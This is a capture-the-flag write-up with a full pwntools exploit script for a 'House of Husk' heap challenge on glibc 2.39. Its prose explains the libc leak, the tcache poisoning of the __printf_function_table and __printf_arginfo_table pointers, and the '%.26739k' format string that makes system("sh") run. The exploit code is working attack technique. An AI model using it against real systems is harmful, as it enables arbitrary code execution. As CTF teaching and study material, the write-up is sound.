---
title: "House of Husk — Hijacking Custom Printf Callbacks for Constraint-Free Exploits on glibc 2.39"
ctf: "heap"
category: "pwn"
difficulty: "easy"
points: null
date: "2026-07-02"
lat: -400
lng: 702
summary: "Using tcache poisoning to target the global __printf_function_table and __printf_arginfo_table pointers, utilizing a custom specifier precision field to cleanly pass an 'sh' string to system()."
tags:
  - "heap"
  - "tcache-poisoning"
  - "house-of-husk"
  - "printf-hooks"
  - "glibc-2.39"
---

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_husk_patched")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def PROTECT_PTR(target,pos):
    return (pos >> 12) ^ target

count = -1
def malloc(idx,size):
    global count
    r.sendlineafter(b"> ",b"1")
    r.sendlineafter(b"19): ",str(idx).encode())
    r.sendlineafter(b"00):",str(size).encode())
    r.recvuntil(b"addr: ")
    count+=1
    return count,int(r.recvline(),16)

def edit(idx,off,ln,data):
    r.sendlineafter(b"> ",b"3")
    r.sendlineafter(b"19): ",str(idx).encode())
    r.sendlineafter(b"Offset: ",str(off).encode())
    r.sendlineafter(b"Length: ",str(ln).encode())
    r.sendafter(b"Data: ",data)

def free(idx):
    r.sendlineafter(b"> ",b"2")
    r.sendlineafter(b"19): ",str(idx).encode())

def show(idx,off,ln):
    r.sendlineafter(b"> ",b"4")
    r.sendlineafter(b"19): ",str(idx).encode())
    r.sendlineafter(b"Offset: ",str(off).encode())
    r.sendlineafter(b"Length: ",str(ln).encode())
    return u64(r.recv(8))

def printf(idx):
    r.sendlineafter(b"> ",b"5")
    r.sendlineafter(b"19): ",str(idx).encode())

def main():
    global r
    r = conn()
```
    Okay, House of Husk! This is the first time I have seen this technique, but either 
    way, we are going to add it to our collection like the others :P

    I will be performing it on the current modern version I am using, glibc 2.39, so it 
    should work perfectly. Let's get started by gathering our libc leak!

```python
    chunkA = malloc(0,0x420)
    guard  = malloc(1,0x18)

    free(chunkA[0])

    lib = show(chunkA[0],0,8) - 0x203b20
    log.success(f"LEAK:\nlibc:{hex(lib)}\n")
    libc.address = lib
```

     The first step is done. Before we dive deeper, there are some critical 
     details we need to understand. The printf() function handles special format 
     characters like %s and %x. Interestingly, these are not hardcoded inside the 
     function itself. Instead, they are managed via two internal tables. Every time 
     printf() encounters a format specifier like %s, it consults these tables to 
     check if the character is registered and initialized.

    Knowing this, we can construct fake tables to trick printf(). When it processes 
    an existing specifier like %s, we can hijack it to call our own function. 
    Alternatively, we can register an entirely new custom specifier, like %k.

    How do these tables work?
    The two relevant tables are named __printf_function_table and __printf_arginfo_table:

        - __printf_function_table: The dispatch table containing callbacks that
         handle 
        custom format specifiers.
        - __printf_arginfo_table: The metadata callback table that informs printf() 
         about how many arguments and what data types the specifier consumes.

    How do they interact with printf() when it is called?
    Let's trace what happens when we use a custom format specifier like %k:
        - The character 'k' is a char, so glibc uses its numeric ASCII value as an 
         array index.
        - On ASCII-based systems, 'k' evaluates to slot 107.
        - glibc reads the function pointers from the arrays like this:
            - __printf_function_table[107] = foo;
            - __printf_arginfo_table[107] = foo_arginfo;

    When printf("%k") parses the 'k', it performs a lookup at slot 107. If the slot 
    contains a non-NULL address, it executes the registered function pointer.

    Now that we understand the structure and purpose of these two tables, our next 
    goal is to construct a pair of fake tables directly on the heap.

```python
    function_table = malloc(2,0x440)
    arginfo_table  = malloc(3,0x440)

    edit(function_table[0],107*8,8,p64(1))
    edit(arginfo_table[0],107*8,8,p64(libc.symbols['system']))
```
       Now for the tcache poisoning part of the exploit. Since these two tables reside in 
       the libc .bss section and we already have a libc leak, we can calculate their 
       exact addresses from the base address. Once we have the addresses, we can use 
       tcache poisoning to overwrite the global pointers, changing them to point to our 
       newly constructed fake tables on the heap. 

```python
   __printf_function = lib + 0x205000 + 0x660
   __printf_arginfo  = lib + 0x205000 + 0x668

    chunkC = malloc(4,0x20)
    chunkD = malloc(5,0x20)
    guard  = malloc(6,0x10)

    free(chunkD[0])
    free(chunkC[0])

    edit(chunkC[0],0,8,p64(PROTECT_PTR(__printf_function,chunkC[1])))

    malloc(7,0x20)
    tables = malloc(8,0x20)

    edit(tables[0],0,16,p64(function_table[1])+p64(arginfo_table[1]))
```

    Instead of using one_gadgets or the function-table callback, we put system() 
    directly into the arginfo table. Here is why that works:

    The printf_info struct layout in glibc 2.39 looks like this:
      offset 0: int prec     ← The first 4 bytes map to RDI when arginfo is called
      offset 4: int width
      offset 8: wchar_t spec

    When printf parses a string like "%.26739k":
      1. The '%' character triggers the allocation of a printf_info struct on the stack.
      2. The '.' followed by "26739" sets info.prec = 26739.
      3. The 'k' character (ASCII 107) acts as our custom specifier.


    Since __printf_function_table[107] is non-NULL, printf enters the custom specifier 
    path and invokes the callback at __printf_arginfo_table[107](&info, n, argtypes, 
    sizes). Crucially, RDI is populated with &info (the address of the stack-allocated 
    printf_info struct).

    Therefore, system(rdi) executes system(&info), which reads the precision field as 
      the string "sh" and pops a shell!

    Why this beats the alternative function-table path:
      - Function callback path: RDI points to the &s->stream FILE structure. The first 
      bytes are typically _IO_MAGIC (0xFBAD8000), starting with a null byte \x00, which 
      evaluates to a harmless system("") no-op.
      - Arginfo callback path: RDI points directly to the printf_info struct, where the 
      precision field at offset 0 is completely under the attacker's control via the 
      format string. This lets us run system("sh") smoothly with no extra constraints.

```python
    chunkL = malloc(9,0x500)
    edit(chunkL[0],0,10,b"%.26739k")

    printf(chunkL[0])

    r.interactive()


if __name__ == "__main__":
    main()
```